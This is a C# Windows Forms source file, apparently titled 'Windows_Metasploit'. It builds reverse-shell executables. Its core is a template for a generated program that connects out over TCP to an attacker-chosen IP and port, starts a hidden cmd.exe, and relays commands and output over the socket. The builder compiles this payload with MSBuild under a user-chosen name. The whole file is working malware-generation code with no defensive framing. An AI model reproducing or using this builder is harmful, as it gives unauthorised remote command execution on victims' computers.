using System;
using System.Diagnostics;
using System.IO;
using System.Threading;
using System.Windows.Forms;

namespace Windows_Metasploit
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        public string csproj = "kyujyhfgf.csproj";
        public string maindir = @"C:\ProgramData\Windows _Metasploit\";
        public string csharpfile = "jkiyujhgfv.cs";
        public string builffile = @"C:\Users\tobal\Desktop\CSharp2ExE\MSBuild.exe";
        public string batchfile = "Cqwe.bat";
        private void StartBuild_Click(object sender, EventArgs e)
        {
            if (!Directory.Exists(maindir))
            {
                Directory.CreateDirectory(maindir);
            }
            if (listeningip.Text != "" && appname.Text != "" && listeningport.Text != "" && landingdir.Text != "")
            {
                getreadyallfiles();
            }
            else
            {
                MessageBox.Show("Fill all of Emm..");
            }
        }

        private void getreadyallfiles()
        {
            string csprojinner = "<?xml version=\"1.0\" encoding=\"utf-8\"?>"+
                                            "<Project ToolsVersion=\"15.0\" xmlns=\"http://schemas.microsoft.com/developer/msbuild/2003\">\n"+
                                            "  <Import Project=\"$(MSBuildExtensionsPath)\\$(MSBuildToolsVersion)\\Microsoft.Common.props\" Condition=\"Exists('$(MSBuildExtensionsPath)\\$(MSBuildToolsVersion)\\Microsoft.Common.props')\" />\n"+
                                            "  <PropertyGroup>\n"+
                                            "    <Configuration Condition=\" '$(Configuration)' == '' \">Debug</Configuration>\n"+
                                             "   <Platform Condition=\" '$(Platform)' == '' \">AnyCPU</Platform>\n"+
                                              "  <ProjectGuid>{68D7DF78-3F0F-4232-A4C5-5F1541F936C3}</ProjectGuid>\n"+
                                               " <OutputType>WinExe</OutputType>\n"+
                                                "<RootNamespace>"+ appname.Text + ".exe</RootNamespace>\n"+
                                                "<AssemblyName>"+ appname.Text + ".exe</AssemblyName>\n"+
                                                "<TargetFrameworkVersion>v4.7.2</TargetFrameworkVersion>\n"+
                                                "<FileAlignment>512</FileAlignment>\n"+
                                                "<AutoGenerateBindingRedirects>true</AutoGenerateBindingRedirects>\n"+
                                                "<Deterministic>true</Deterministic>\n"+
                                              "</PropertyGroup>\n"+
                                              "<PropertyGroup Condition=\" '$(Configuration)|$(Platform)' == 'Debug|AnyCPU' \">\n"+
                                              "  <PlatformTarget>AnyCPU</PlatformTarget>\n"+
                                              "  <DebugSymbols>true</DebugSymbols>\n"+
                                              "  <DebugType>full</DebugType>\n"+
                                              "  <Optimize>false</Optimize>\n"+
                                              "  <OutputPath>bin\\Debug\\</OutputPath>\n"+
                                              "  <DefineConstants>DEBUG;TRACE</DefineConstants>\n"+
                                              "  <ErrorReport>prompt</ErrorReport>\n"+
                                              "  <WarningLevel>4</WarningLevel>\n"+
                                              "</PropertyGroup>\n"+
                                              "<PropertyGroup Condition=\" '$(Configuration)|$(Platform)' == 'Release|AnyCPU' \">\n"+
                                              "  <PlatformTarget>AnyCPU</PlatformTarget>\n"+
                                              "  <DebugType>pdbonly</DebugType>\n"+
                                              "  <Optimize>true</Optimize>\n"+
                                              "  <OutputPath>bin\\Release\\</OutputPath>\n"+
                                              "  <DefineConstants>TRACE</DefineConstants>\n"+
                                              "  <ErrorReport>prompt</ErrorReport>\n"+
                                              "  <WarningLevel>4</WarningLevel>"+
                                              "</PropertyGroup>"+
                                              "<ItemGroup>\n"+
                                              "  <Reference Include=\"System\" />\n"+
                                             "   <Reference Include=\"System.Core\" />\n"+
                                             "   <Reference Include=\"System.Xml.Linq\" />\n"+
                                             "   <Reference Include=\"System.Data.DataSetExtensions\" />\n"+
                                             "   <Reference Include=\"Microsoft.CSharp\" />\n"+
                                             "   <Reference Include=\"System.Data\" />\n"+
                                             "   <Reference Include=\"System.Net.Http\" />"+
                                             "   <Reference Include=\"System.Xml\" />\n"+
                                             " </ItemGroup>\n"+
                                             " <ItemGroup>\n"+
                                             "   <Compile Include=\""+csharpfile+"\" />\n"+
                                             " </ItemGroup>\n"+
                                              "<ItemGroup>\n"+
                                               " <None Include=\"App.config\" />\n"+
                                              "</ItemGroup>\n"+
                                             " <Import Project=\"$(MSBuildToolsPath)\\Microsoft.CSharp.targets\" />\n"+
                                            "</Project>";
            using (StreamWriter sd = new StreamWriter(maindir + csproj))
            {
                sd.Write(csprojinner);
            }

            string csharpcode = "using System;using System.Diagnostics;using System.IO;using System.Net.Sockets;using System.Text;"+
                              "  namespace "+ appname.Text + "{\n"+
                                        "public class Program{"+
                                           " static StreamWriter streamWriter;"+
                                         "   public static void Main(string[] args)"+
                                           " {"+
                                                "try{"+
                                                   " using (TcpClient client = new TcpClient(\""+listeningip.Text+"\", "+listeningport.Text+")){"+
                                                     "   using (Stream stream = client.GetStream()){"+
                                                            "using (StreamReader rdr = new StreamReader(stream)){\n"+
                                                               " streamWriter = new StreamWriter(stream);\n"+
                                                               " StringBuilder strInput = new StringBuilder();\n"+

                                                              "  Process p = new Process();\n"+
                                                               " p.StartInfo.FileName = \"cmd.exe\";"+
                                                               " p.StartInfo.CreateNoWindow = true;\n"+
                                                               " p.StartInfo.UseShellExecute = false;\n"+
                                                              "  p.StartInfo.RedirectStandardOutput = true;\n"+
                                                             "   p.StartInfo.RedirectStandardInput = true;\n"+
                                                             "   p.StartInfo.RedirectStandardError = true;\n"+
                                                              "  p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);\n"+
                                                              "  p.Start();\n"+
                                                              "  p.BeginOutputReadLine();\n"+

                                                              "  while (true){\n"+
                                                                 "  strInput.Append(rdr.ReadLine());\n"+
                                                                   " //strInput.Append(\"\\n\");\n"+
                                                                 "   p.StandardInput.WriteLine(strInput);\n"+
                                                                "    strInput.Remove(0, strInput.Length);\n"+
                                                               " }\n"+
                                                          "  }"+
                                                       " }"+
                                                  "  }"+
                                               " }catch (Exception vb) { }"+
                                           " }"+

                                          "  private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)\n"+
                                          "  {\n"+
                                               " StringBuilder strOutput = new StringBuilder();\n"+
                                              "  if (!String.IsNullOrEmpty(outLine.Data)){\n"+
                                                 "   try{\n"+
                                                   "     strOutput.Append(outLine.Data);\n"+
                                                    "    streamWriter.WriteLine(strOutput);\n"+
                                                  "      streamWriter.Flush();\n"+
                                                  "  }catch (Exception err) { }\n"+
                                               " }\n"+
                                           " }\n"+

                                       " }\n"+
                              "  }";
            using(StreamWriter uy = new StreamWriter(maindir+ csharpfile))
            {
                uy.Write(csharpcode);
            }

            using(StreamWriter ad = new StreamWriter(maindir + "App.config")){
                ad.Write("<?xml version=\"1.0\" encoding=\"utf-8\" ?>"+
                            "<configuration>"+
                               " <startup> "+
                                  "  <supportedRuntime version=\"v4.0\" sku=\".NETFramework,Version=v4.7.2\" />"+
                               " </startup>"+
                           " </configuration>");
            }

            using (StreamWriter gg = new StreamWriter(maindir + batchfile))
            {
                gg.Write(builffile + " \""+ maindir+csproj + " \""+ Environment.NewLine + "Pause");
            }
            Thread.Sleep(1400);
            Process.Start(maindir + batchfile);
            while(File.Exists(@"C:\ProgramData\Windows _Metasploit\bin\Debug\" + appname.Text + ".exe"))
            {
                File.Move(@"C:\ProgramData\Windows _Metasploit\bin\Debug\" + appname.Text + ".exe", landingdir.Text);
            }
        }

        private void movedfiledir_Click(object sender, EventArgs e)
        {
            FolderBrowserDialog af = new FolderBrowserDialog();

            if (af.ShowDialog() == DialogResult.OK)
            {
                landingdir.Text = af.SelectedPath;
            }
        }
    }
}
